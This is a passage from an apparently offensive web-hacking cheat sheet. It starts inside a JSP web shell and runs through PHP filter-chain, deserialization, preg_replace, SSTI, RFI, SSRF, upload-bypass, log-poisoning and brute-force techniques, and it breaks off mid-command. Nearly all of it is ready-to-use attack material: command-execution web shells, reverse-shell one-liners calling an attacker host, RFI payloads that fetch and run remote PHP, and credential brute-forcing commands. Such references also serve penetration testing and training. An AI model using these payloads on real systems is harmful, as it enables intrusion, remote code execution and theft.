<%@ page import="java.io.*, java.util.*, java.net.*" %>
<%
    String action = request.getParameter("action");
    String output = "";

    try {
        if ("cmd".equals(action)) {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output += line + "\\n";
                }
                reader.close();
            }
        } else {
            output = "Unknown action.";
        }
    } catch (Exception e) {
        output = "Error: " + e.getMessage();
    }
    response.setContentType("text/plain");
    out.print(output);
%>
```

```console
$ cat shell.jsp >> <FILE>.jpg
```

## mitmproxy

```console
$ mitmproxy
```

## Next.js

### Path Enumeration

```console
console.log(__BUILD_MANIFEST.sortedPages)
console.log(__BUILD_MANIFEST.sortedPages.join('\n'));
console.log('Pages List:\n' + __BUILD_MANIFEST.sortedPages.map((page, index) => `${index + 1}. ${page}`).join('\n'));
```

## ngrok

> https://ngrok.com/

### Basic Commands

```console
$ ngrok tcp 9001
$ ngrok http 8080 --authtoken <AUTH_TOKEN>
$ ngrok http 8080 --basic-auth '<USERNAME>:<PASSWORD>'
$ ngrok http 8080 --oauth=google --oauth-allow-email=<EMAIL>
$ ngrok http http://localhost:8080
$ ngrok http http://localhost:8080 --authtoken <AUTH_TOKEN>
$ ngrok http http://localhost:8080 --basic-auth '<USERNAME>:<PASSWORD>'
$ ngrok http http://localhost:8080 --oauth=google --oauth-allow-email=<EMAIL>
```

### Example

```console
$ ngrok authtoken <AUTH_TOKEN>
$ ngrok tcp <LHOST>:<LPORT>
$ nc -v -nls 127.0.0.1 -p <LPORT>
$ nc 1.tcp.ngrok.io 10133
```

### Docker Example

```console
$ sudo docker run -it -p80 -e NGROK_AUTHTOKEN='<API_TOKEN>' ngrok/ngrok tcp 172.17.0.1:<LPORT>
$ nc -v -nls 172.17.0.1 -p <LPORT>
$ nc 1.tcp.ngrok.io 10133
```

### Client-less

```console
$ ssh -R 80:localhost:80 tunnel.us.ngrok.com http
$ ssh -R <RHOST>:80:localhost:8080 tunnel.us.ngrok.com http -oauth="google"
```

## OpenSSL

```console
$ openssl s_client -connect <RHOST>:<RPORT> < /dev/null | openssl x509 -noout -text | grep -C3 -i dns
```

## PadBuster

> https://github.com/AonCyberLabs/PadBuster

```console
$ padbuster http://<RHOST> MbDbr%2Fl3cYxICLVXwfJk8Y4C94gp%2BnlB 8 -cookie auth=MbDbr%2Fl3cYxICLVXwfJk8Y4C94gp%2BnlB -plaintext user=admin
$ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=<COOKIE_VALUE>;PHPSESSID=<PHPSESSID>"
$ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=<COOKIE_VALUE>;PHPSESSID=<PHPSESSID>" -plaintext "{\"user\":\"<USERNAME>\",\"role\":\"admin\"}"
```

## PDF PHP Inclusion

### Create a File with a PDF Header, which contains PHP Code

```console
%PDF-1.4

<?php
    system($_GET["cmd"]);
?>
```

### Trigger

```console
$ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
```

## PHP

### PHP Functions

> https://www.php.net/manual/en/funcref.php

> https://www.php.net/manual/en/ref.filesystem.php

```console
+----------------+-----------------+----------------+----------------+
|    Command     | Displays Output | Can Get Output | Gets Exit Code |
+----------------+-----------------+----------------+----------------+
| system()       | Yes (as text)   | Last line only | Yes            |
| passthru()     | Yes (raw)       | No             | Yes            |
| exec()         | No              | Yes (array)    | Yes            |
| shell_exec()   | No              | Yes (string)   | No             |
| backticks (``) | No              | Yes (string)   | No             |
+----------------+-----------------+----------------+----------------+
```

### phpinfo.phar

```php
<?php phpinfo(); ?>
```

### phpinfo Dump

```console
file_put_contents to put <?php phpinfo(); ?>
```

### Checking for Remote Code Execution (RCE)

> https://gist.github.com/jaquen/aab510eead65c9c95aa20a69d89c9d2a?s=09

```php
<?php

// A script to check what you can use for RCE on a target

$test_command = 'echo "time for some fun!"';
$functions_to_test = [
    'system',
    'shell_exec',
    'exec',
    'passthru',
    'popen',
    'proc_open',
];

function test_function($func_name, $test_command) {
    if (function_exists($func_name)) {
        try {
            $output = @$func_name($test_command);
            if ($output) {
                echo "Function '{$func_name}' enabled and executed the test command.\n";
            } else {
                echo "Function '{$func_name}' enabled, but failed to execute the test command.\n";
            }
        } catch (Throwable $e) {
            echo "Function '{$func_name}' enabled, but an error occurred: {$e->getMessage()}\n";
        }
    } else {
        echo "Function '{$func_name}' disabled or not available.\n";
    }
}

foreach ($functions_to_test as $func) {
    test_function($func, $test_command);
} ?>
```

### PHP Filter Chain Generator

> https://github.com/synacktiv/php_filter_chain_generator

#### Common Payloads

```console
$ python3 php_filter_chain_generator.py --chain '<?= exec($_GET["0"]); ?>'
$ python3 php_filter_chain_generator.py --chain '<?php echo shell_exec("id"); ?>'
$ python3 php_filter_chain_generator.py --chain '<?php system("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"); ?>'
$ python3 php_filter_chain_generator.py --chain '<?php passthru("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"); ?>'
$ python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>"
$ python3 php_filter_chain_generator.py --chain "<?php echo shell_exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>"
```

#### Payload Execution

```console
http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
```

OR

```console
$ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
```

#### Curl Example

```console
$ python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>" | grep "^php" > <FILE>
```

```console
$ curl "http://<RHOST>/index.php?file=$(cat <FILE>)"
```

### PHP Deserialization (Web Server Poisoning)

#### Finding PHP Deserialization Vulnerability

```console
$ grep -R serialize
```

```console
/index.php:        base64_encode(serialize($page)),
/index.php:unserialize($cookie);
```

#### Skeleton Payload

```php
if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID',
        base64_encode(serialize($page)),
        time()+60*60*24,
        '/'
    );
}
```

#### Decoding and Web Server Poisoning

```console
$ echo "Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9" | base64 -d
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
```

#### Encoding

```console
$ python
Python 2.7.18 (default, Apr 28 2021, 17:39:59) 
[GCC 10.2.1 20210110] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> len("/www/index.html")
15
```

```console
$ echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}' | base64
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K
```

#### Skeleton Payload Request

```console
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: <?php system('cat /');?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

### PHP eval()

#### Exploiting eval() base64 payload

```console
${system(base64_decode(b64-encoded-command))}
```

### PHP Generic Gadget Chains (PHPGGC)

> https://github.com/ambionics/phpggc

#### Dropping a File

```console
$ phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
```

### PHP Injection

#### Skeleton Payload Request

```console
POST /profilepicture.php HTTP/1.1
...
Connection: close
Cookie: PHPSESSID=bot0hfe9lt6mfjnki9ia71lk2k
Upgrade-Insecure-Requests: 1

<PAYLOAD>
```

#### Payloads

```console
url=/etc/passwd
url=file:////home/<USERNAME>/.ssh/authorized_keys
<?php print exec(ls) ?>
```

### PHP preg_replace()

#### Exploitation

> https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace

```console
pattern=/ip_address/e&ipaddress=system('id')&text="openvpn": {
```

#### Remote Code Execution

```console
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 303
Origin: http://www.securewebinc.jet
DNT: 1
Connection: close
Referer: http://<RHOST>/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php
Cookie: PHPSESSID=4bsdjba9nanh5nc6off028k403
Upgrade-Insecure-Requests: 1

swearwords%5B%2Ffuck%2Fi%5D=make+love&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=test%40test.de&subject=test&message=%3Cp%3Etest%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1
```

#### Skeleton Payload Request

```console
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php?cmd=ls HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 259
Connection: close
Referer: http://<RHOST>/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php
Cookie: PHPSESSID=4bsdjba9nanh5nc6off028k403
Upgrade-Insecure-Requests: 1

swearwords[/fuck/ie]=system($_GET["cmd"])&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=badperson&to=nora@example.com&subject=sdfj&message=swearwords[/fuck/]&_wysihtml5_mo
de=1
```

### PHP strcmp

#### Bypass

```php
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: ../upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
}
```

##### Explanation

The developer is using `strcmp` to check the `username` and `password`, which is insecure and can easily be bypassed.

This is due to the fact that if `strcmp` is given an `empty array` to compare against the `stored password`, it will return `null`.

In PHP the `==` operator only checks the value of a variable for `equality`, and the value of `NULL` is equal to `0`.

The correct way to write this would be with the === operator which checks both value and type. Let's open `Burp Suite` and catch the login request.

#### Bypassing

Change `POST` data as follows to bypass the login.

```console
username[]=admin&password[]=admin
```

### PHP verb File Upload

```console
$ curl -X PUT -d '<?php system($_GET["c"]);?>' http://<RHOST>/<FILE>.php
```

## Poison Null Byte

### Error Message

`Only .md and .pdf files are allowed!`

### Example

```console
%00
```

### Bypass

```console
$ curl http://<RHOST>/ftp/package.json.bak%2500.md
```

## Remote File Inclusion (RFI)

```console
$ http://<RHOST>/PATH/TO/FILE/?page=http://<RHOST>/<FILE>.php
$ http://<RHOST>/index.php?page=' and die(system("curl http://<LHOST>/<FILE>.php|php")) or '
$ http://<RHOST>/index.php?page=%27%20and%20die(system(%22curl%20http://<LHOST>/<FILE>.php|php%22))%20or%20%27
```

### Root Cause Function

```console
allow_url_fopen
```

### Code Execution

```console
$ User-Agent: <?system('wget http://<LHOST>/<FILE>.php -O <FILE>.php');?>
$ http://<RHOST>/view.php?page=../../../../../proc/self/environ
```

### WAF Bypass

```
$ http://<RHOST>/page=http://<LHOST>/<SHELL>.php%00
$ http://<RHOST>/page=http://<LHOST>/<SHELL>.php?
```

## Server-Side Request Forgery (SSRF)

### &x=

```console
$ https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
```

The payload ending in `&x=` is being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string.

### 0-Cut Bypass

```console
http://1.1          // http://1.0.0.1
http://127.0.0.1    // http://127.1.1
http://192.168.1    // http://192.168.0.1
```

### Bypass List

```console
http://localhost
http://127.0.0.1
http://2130706433
http://0177.1
http://0x7f.1
http://127.000.000.1
http://127.0.0.1.nip .io
http://[::1]
http://[::]
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

### Server-Side Request Forgery Mass Bypass

```console
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

### URL Parser Abuse

> https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

```console
url=http%3A%2F%2F<LHOST>+-H+"asdf;"+-d+"@/etc/passwd"
```

## Server-Side Template Injection (SSTI)

### Fuzz String

> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

```console
${{<%[%'"}}%\.
```

### Magic Payload

> https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

```console
{{ ‘’.__class__.__mro__[1].__subclasses__() }}
```

### Jinja

```console
{{malicious()}}
```

### Jinja2

```console
</title></item>{{4*4}}
```

### Payload

```console
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Payload

```console
{{''.__class__.__base__.__subclasses__()[141].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
```

### Evil Config

#### Config

```console
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
```

#### Load Evil Config

```console
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
```

#### Connect to Evil Host

```console
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"',shell=True) }}
```

#### Example

```console
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

## Spring Framework

### Spring Boot Actuator

> https://www.wiz.io/blog/spring-boot-actuator-misconfigurations

> https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators

#### heapdump

```console
$ strings heapdump | grep -E "^Host:\s+\S+$" -C 10
```

### Micro-Service Abuse

> https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka

```console
POST /eureka/apps/WEBSERVICE HTTP/1.1
Accept: application/json, application/*+json
Accept-Encoding: gzip
Content-Type: application/json
User-Agent: Java/11.0.10
Host: 127.0.0.1:8088
Connection: keep-alive
Content-Length: 1015

{
  "instance": {
    "instanceId": "host.docker.internal:webservice:8082",
    "app": "WEBSERVICE",
    "appGroupName": null,
    "ipAddr": "192.168.2.1",
    "sid": "na",
    "homePageUrl": "http://host.docker.internal:8082/",
    "statusPageUrl": "http://host.docker.internal:8082/actuator/info",
    "healthCheckUrl": "http://host.docker.internal:8082/actuator/health",
    "secureHealthCheckUrl": null,
    "vipAddress": "webservice",
    "secureVipAddress": "webservice",
    "countryId": 1,
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    },
    "hostName": "host.docker.internal",
    "status": "UP",
    "overriddenStatus": "UNKNOWN",
    "leaseInfo": {
      "renewalIntervalInSecs": 30,
      "durationInSecs": 90,
      "registrationTimestamp": 0,
      "lastRenewalTimestamp": 0,
      "evictionTimestamp": 0,
      "serviceUpTimestamp": 0
    },
    "isCoordinatingDiscoveryServer": false,
    "lastUpdatedTimestamp": 1630906180645,
    "lastDirtyTimestamp": 1630906182808,
    "actionType": null,
    "asgName": null,
    "port": {
      "$": 8082,
      "@enabled": "true"
    },
    "securePort": {
      "$": 443,
      "@enabled": "false"
    },
    "metadata": {
      "management.port": "8082"
    }
  }
}
```

## Subdomain Takeover

> https://www.youtube.com/watch?v=w4JdIgRGVrE

> https://github.com/EdOverflow/can-i-take-over-xyz

### Check manually for vulnerable Subdomains

```console
$ curl https://<DOMAIN> | egrep -i "404|GitHub Page"
```

### Responsible Vulnerability Handling

#### Example

##### GitHub Pages

###### CNAME

```console
<SUBDOMAIN>.<DOMAIN>
```

###### 2fchn734865gh234356h668j4dsrtbse9056gh405.html

```console
<!-- PoC by Red Team -->
```

## Symfony

> https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144

### Enumeration

```console
http://<RHOST>/_profiler
http://<RHOST>/app_dev.php/_profiler
http://<RHOST>/app_dev.php
http://<RHOST>/app_dev.php/_profiler/phpinfo
http://<RHOST>/app_dev.php/_profiler/open?file=app/config/parameters.yml
```

### Exploit

> https://github.com/ambionics/symfony-exploits

```console
$ python3 secret_fragment_exploit.py 'http://<RHOST>/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://<RHOST>/_fragment' --function system --parameters 'id'
```

## unfurl

> https://github.com/tomnomnom/unfurl

```console
$ go install github.com/tomnomnom/unfurl@latest
```

## uro

> https://github.com/s0md3v/uro

```console
$ pipx install uro
```

## Upload Filter Bypass

### Java Server Pages (JSP) Filter Bypass

```console
.MF
.jspx
.jspf
.jsw
.jsv
.xml
.war
.jsp
.aspx
```

### PHP Filter Bypass

```console
.sh
.cgi
.inc
.txt
.pht
.phtml
.phP
.Php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.php.
.php%00.jpeg
```

### Content-Types

```console
Content-Type : image/gif
Content-Type : image/png
Content-Type : image/jpeg
```

### Examples

#### Null Bytes

```console
$ mv <FILE>.jpg <FILE>.php\x00.jpg
```

#### More Bypass Examples

```console
<FILE>.php%20
<FILE>.php%0d%0a.jpg
<FILE>.php%0a
<FILE>.php.jpg
<FILE>.php%00.gif
<FILE>.php\x00.gif
<FILE>.php%00.png
<FILE>.php\x00.png
<FILE>.php%00.jpg
<FILE>.php\x00.jpg
```

## Upload Vulnerabilities

```console
ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
SVG: Stored XSS / Server-Side Request Forgery
GIF: Stored XSS
CSV: CSV Injection
XML: XXE
AVI: Local File Inclusion / Server-Side request Forgery
HTML/JS: HTML Injection / XSS / Open Redirect
PNG / JPEG: Pixel Flood Attack
ZIP: Remote Code Exection via Local File Inclusion
PDF / PPTX: Server-Side Request Forgery / Blind XXE
```

## waybackurls

> https://github.com/tomnomnom/waybackurls

```console
$ go install github.com/tomnomnom/waybackurls@latest
```

## Web Application Firewall (WAF) Bypasses

### Frameworks

```console
- \x09       // Spring Framework
- \xA0       // Express Framework
- \x1C-1F    // Flask
```

```console
GET /wp-login.php\xA0 HTTP/1.1

200 OK
```

## Web Log Poisoning

### Web Shell

```console
$ nc <RHOST> 80
```

```console
GET /<?php echo shell_exec($_GET['cmd']); ?> HTTP/1.1
Host: <RHOST>
Connection: close
```

```console
http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log&cmd=id
```

### Code Execution

```console
$ nc <RHOST> 80
```

```console
GET /<?php passthru('id'); ?> HTTP/1.1
Host: <RHOST>
Connection: close
```

```console
http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log
```

## Websocket Request Smuggling

### Request Example

- Disable `Update Content-Length`

```console
GET /socket HTTP/1.1
Host: <RHOST>:<RPORT>
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /<FILE> HTTP/1.1
Host: <RHOST>:<RPORT>


```

### Server-Side Request Forgery (SSRF) Example

#### Fake Webserver

```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

```console
$ python3 webserver.py <LPORT>
```

```console
GET /check-url?server=http://<LHOST>:<LPORT> HTTP/1.1
Host: <RHOST>:<RPORT>
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: <RHOST>:<RPORT>


```

## Wfuzz

> https://github.com/xmendez/wfuzz

```console
$ wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
```

### Write to File

```console
$ wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
```

### Custom Scan with limited Output

```console
$ wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
```

### Fuzzing two Parameters at once

```console
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
```

### Domain

```console
$ wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
```

### Subdomain

```console
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
```

### Git

```console
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
```
### Login

```console
$ wfuzz -c -z file,usernames.txt -z file,passwords.txt -u http://<RHOST>/login.php -d "username=FUZZ&password=FUZ2Z" --hs "Login failed!"
$ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --hc 200 -c
$ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --ss "Invalid login"
```

### SQL

```console
$ wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
```

### DNS

```console
$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
$ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
$ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
```

### Numbering Files

```console
$ wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
```

### Enumerating PIDs

```console
$ wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```

### Server-Side Request Forgery (SSRF) Enumeration

```console
$ wfuzz -c -z range,1-65535 --hh 0 -b "token=<TOKEN>" 'http://<RHOST>/api/status?url="http://localhost:FUZZ/"'
```

## WhatWeb

> https://github.com/urbanadventurer/WhatWeb

```console
$ whatweb -v -a 3 <RHOST>
```

## Wordpress

### Config Path

```console
/var/www/wordpress/wp-config.php
```

## WPScan

```console
$ wpscan --url https://<RHOST> --enumerate u,t,p
$ wpscan --url https://<RHOST> --plugins-detection aggressive
$ wpscan --url https://<RHOST> --disable-tls-checks
$ wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
$ wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```

## wrapwrap

### Generating Payload

```console
$ python3 wrapwrap.py /etc/passwd "GIF89a" "" 1000
```

### Payload Execution

```console
$ curl 'http://<RHOST>/wp-admin/admin-ajax.php' -H "Content-Type: application/x-www-form-urlencoded" -d 'action=upload_image_from_url&id=1&url=php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.